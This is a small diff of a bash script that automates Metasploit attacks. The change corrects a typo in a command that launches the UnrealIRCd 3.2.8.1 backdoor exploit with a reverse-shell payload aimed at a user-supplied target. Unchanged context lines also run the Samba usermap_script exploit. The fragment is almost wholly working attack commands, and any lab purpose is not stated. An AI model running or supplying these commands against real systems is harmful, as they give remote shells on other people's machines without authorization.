@@ -18,5 +18,5 @@ read VAR
       		msfconsole -q -x "use exploit/multi/samba/usermap_script; set rhost $ip; set lport $lport; exploit;"
 	fi
 	if [[ $VAR = 2 ]]; then
-      		msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set payload cmd/unix/reverse; set rhost $ip; set lhost $lhost; set lport $lport; exploiat;"
+      		msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set payload cmd/unix/reverse; set rhost $ip; set lhost $lhost; set lport $lport; exploit;"
 	fi
